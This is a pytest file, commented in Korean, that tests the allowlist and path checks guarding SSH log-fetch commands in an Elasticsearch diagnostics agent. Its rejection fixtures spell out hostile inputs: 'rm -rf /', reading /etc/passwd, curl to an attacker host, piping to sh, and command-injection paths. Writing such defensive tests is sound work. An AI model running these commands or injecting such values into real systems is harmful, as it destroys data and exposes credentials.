"""SSH 명령 조립의 안전장치.

이 경로에 LLM이 만든 문자열이 직접 닿지는 않지만(키워드는 정규식으로 씻고,
경로는 ES 조회에서 온다), 원격 셸 명령에서 "닿지 않는다"는 근거는 코드가
보장해야 한다 — ES 응답도, 노드 설정도 이 프로세스가 통제하지 않는 입력이다.
"""

import pytest

from cluster_doctor.agent.integrations.ssh.fetcher import (
    _ALLOWED_COMMANDS,
    _SEVERITY_PATTERN,
    UnsafeSshCommandError,
    _assert_allowed,
    _assert_safe_path,
    _split_pipeline,
)

REAL_COMMAND = (
    f"grep -aE '{_SEVERITY_PATTERN}' '/var/log/elasticsearch/es-prod.log'"
    r" | grep '\[2026-09-18'"
    " | tail -n 2000"
)


class TestPipelineSplitting:
    def test_따옴표_밖의_파이프로만_나눈다(self):
        """severity 정규식 자체가 교대(|)를 쓴다. 따옴표를 무시하고 나누면
        정규식 조각이 "프로그램 이름"으로 검사되어 정상 명령이 전부 거절된다."""
        assert len(_split_pipeline(REAL_COMMAND)) == 3

    def test_따옴표_안의_파이프는_세지_않는다(self):
        assert _split_pipeline("grep -E 'a|b|c' file") == ["grep -E 'a|b|c' file"]

    def test_큰따옴표도_같다(self):
        assert _split_pipeline('grep "a|b" f') == ['grep "a|b" f']


class TestAllowlist:
    def test_실제_명령은_통과한다(self):
        assert _assert_allowed(REAL_COMMAND) == REAL_COMMAND

    @pytest.mark.parametrize(
        "command",
        [
            "grep x file | rm -rf /",
            "cat /etc/passwd",
            "grep x file | curl http://attacker/",
            "tail -n 10 f | sh",
        ],
    )
    def test_허용되지_않은_프로그램을_막는다(self, command):
        with pytest.raises(UnsafeSshCommandError):
            _assert_allowed(command)

    def test_allowlist는_grep과_tail_뿐이다(self):
        """늘릴 때는 왜 필요한지 함께 남겨야 한다. 조용히 늘어나면 allowlist가
        의미를 잃는다."""
        assert set(_ALLOWED_COMMANDS) == {"grep", "tail"}


class TestPathValidation:
    @pytest.mark.parametrize(
        "path",
        ["/var/log/elasticsearch", "es-prod", "logs/es_1.log", "/a-b/c.d"],
    )
    def test_평범한_경로는_통과한다(self, path):
        assert _assert_safe_path(path, "log_path") == path

    @pytest.mark.parametrize(
        "path",
        [
            "/var/log'; rm -rf /; '",
            "/var/log/$(whoami)",
            "/var/log/`id`",
            "/var/log && echo x",
            "/var/log\nrm -rf /",
            "",
        ],
    )
    def test_셸_메타문자가_있으면_거절한다(self, path):
        with pytest.raises(UnsafeSshCommandError):
            _assert_safe_path(path, "log_path")

    def test_거절_메시지에_값을_싣지_않는다(self):
        """경로에 자격증명이 섞여 들어올 수 있다. 어느 필드가 문제인지만 말한다."""
        with pytest.raises(UnsafeSshCommandError) as caught:
            _assert_safe_path("/secret/$(cat key)", "log_path")

        assert "log_path" in str(caught.value)
        assert "secret" not in str(caught.value)
